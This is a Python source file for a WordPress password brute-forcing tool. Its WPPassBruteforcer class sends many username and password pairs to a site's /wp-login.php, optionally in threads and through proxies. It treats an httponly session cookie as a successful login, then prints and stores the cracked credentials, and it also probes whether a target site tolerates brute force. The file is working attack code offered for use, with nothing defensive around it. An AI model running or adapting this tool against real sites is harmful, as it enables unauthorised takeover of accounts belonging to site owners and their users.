import threading
from Lib.queue import Queue as BlockingQueue
from concurrent.futures.thread import ThreadPoolExecutor
from http_handler.http_handler import HTTPRequest
from wordpress.wplogs import WPLogs
from wordpress.wpdetector import WPDetector
from wordpress.wpenumerator import WPEnumerator
class WPPassBruteforcer(object):

    _DEFAULT_TUPLE_INDEX = 0
    _DEFAULT_DICT_COOKIE = 'set-cookie'
    _SUCCESS = 'httponly'
    _NUM_OF_THREADS = 1
    _SHUT_DOWN_KEY = -1
    _ERROR_MSG = "Error"
    _ERROR_LIMIT = 10
    _WP_ADMIN = "/wp-login.php"

    def __init__(self, domain, additional_data=None, proxies=None):
        self._url = domain
        self._wp_admin_url = str(str(domain)+str(self._WP_ADMIN)).replace("//"+str(self._WP_ADMIN), "/"+str(self._WP_ADMIN))
        self._additional_data = additional_data
        self._proxies = proxies
        self._is_running = False # should make volatile var
        self._errors = 0 # should make volatile var
        self._cracked_data = dict()
        self._passwords = set()
        self._username_q = BlockingQueue()
        self._log = WPLogs()
        self._detector = WPDetector(domain,proxies)
        self._enumerator = WPEnumerator(domain,proxies=proxies)
        self._http = HTTPRequest()
        self._log = WPLogs()


    def __run(self):
        try:
            while not self._username_q.empty():
                if self.__is_errors_exceeded_the_limit(False) is True:
                    break
                username = self._username_q.get(block=False)
                check_if_cracked = self.__is_cracked(username)
                if check_if_cracked is not False:
                    if self.__try(username, check_if_cracked) is True:
                        continue
                self.__crack(username, self._passwords)
        except Exception as e:
            self.__save_log(e, "Error: Thread (" + str(threading.current_thread().getName()) + ") has crushed.")

    def __insert_Q(self, username_list=None, single=None):
        try:
            if username_list is not None:
                for usr in username_list:
                    self._username_q.put(usr)
            if single is not None:
                self._username_q.put(username_list)
        except Exception as e:
            self.__save_log(e, "Error: cannot put to the username_q")

    def bruteforce(self, usernames, passwords, threads=_NUM_OF_THREADS, proxies=None, test_if_poss=False, main_work=True):
        if test_if_poss is True and self.__test_possibility() is False:
            return self.get_cracked_data()
        if threads <= 0:
            threads = 1
        executor = ThreadPoolExecutor(max_workers=threads)
        try:
            if self._is_running is True:
                print("Brute Force is running - please wait.")
                return None
            self._is_running = True
            self._errors = 0
            self.__insert_Q(username_list=usernames)
            self._passwords = set(passwords)
            if proxies is not None:
                self._proxies = proxies
            active_threads = threading.active_count()
            if threads > 0:
                for i in range(0, threads):
                    executor.submit(self.__run())
            if main_work is True:
                self.__run()
        except Exception as e:
            self.__save_log(e, "Error: executor has crushed, threads created: "+str((threading.active_count()-active_threads)))
        finally:
            if threading.active_count()-active_threads > 0:
                executor.shutdown(wait=True)
            self._is_running = False
            self.__is_errors_exceeded_the_limit(True)

        return self.get_cracked_data()

    def get_cracked_data(self):
        return self._cracked_data

    def is_method_possible(self):
        try:
            is_data_available = len(self._cracked_data.items()) > 0
            if is_data_available is True:
                return True
            is_wp = self._detector.detect(self._url)
            is_en_wp = self._enumerator.is_enumeration_possible()
            is_errors_limit = self.__is_errors_exceeded_the_limit(False)
            if (is_wp or is_en_wp) and is_errors_limit is False:
                return self.__test_possibility()
        except Exception as e:
            self.__save_log(e, "Error: could not test if brute force is possible on this site: "+str(self._url))
            return False

    def __crack(self, username, passwords):
        try:
            if self.__is_cracked(username) is True:
                return None
            for pwd in passwords:
                if self.__is_errors_exceeded_the_limit(False) is True:
                    return self._ERROR_MSG
                res = self.__try(username, pwd)
                if res is True:
                    self.__save(username, pwd)
                    print("Cracked: "+str(username)+": "+str(pwd))
                    return None
                elif res is False:
                    print("Not Cracked: "+str(username)+": "+str(pwd))
                elif res is self._ERROR_MSG:
                    print("Could not reach the login page or the site cookies: "+str(username)+": "+str(pwd))
                    self._errors += 1
        except Exception as e:
            self.__save_log(e, "Error: __crack method crashed for username: "+str(username))

    def __try(self, username, password):
        try:
            headers = {'Content-type': 'application/x-www-form-urlencoded',
                       'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1' }
            response = self._http.request(self._wp_admin_url, "POST", parameters=parameters, type="http_lib", headers=headers, proxies=self._proxies)
            if response is None:
                return False
            elif str(response[self._DEFAULT_TUPLE_INDEX][self._DEFAULT_DICT_COOKIE].split(" ")[-1]).lower() == self._SUCCESS:
                return True
        except Exception as e:
            self.__save_log(e, "Error: brute force failed for "+str(username)+":"+str(password))
            return self._ERROR_MSG

        return False

    def __save(self, username, password):
        try:
            self._cracked_data[username] = password
        except Exception as e:
            self.__save_log(e, "Error: save cracked user_name & pass failed for "+str(username)+":"+str(password))

    def __save_log(self, exception, message=None):
        try:
            self._log.save_log(exception)
            if message is not None:
                self._log.save_log(message)
                print(message)
        except:
            print("Error: saving log is failed.")

    def __is_cracked(self, username):
        try:
            res = self._cracked_data[username]
            return res
        except:
            return False

    def __is_errors_exceeded_the_limit(self, print_error=False):
        result = False
        if self._errors >= self._ERROR_LIMIT:
            result = True
            if print_error is True:
                print("The number of errors has exceeded the limit, please check the parameters given"
                      " - they probably do not allow strong force for this site.")
        return result

    def __test_possibility(self):
        try:
            usernames = list()
            passwords = list()
            passwords.append("123")
            for i in range(0, self._ERROR_LIMIT+1):
                usernames.append(str(i))
            self.bruteforce(usernames=usernames, passwords=passwords, threads=0, test_if_poss=False, main_work=True)
            return not self.__is_errors_exceeded_the_limit(False)
        except Exception as e:
            self.__save_log(e, "Error: could not test possibility on this site: "+str(self._wp_admin_url))
            return False
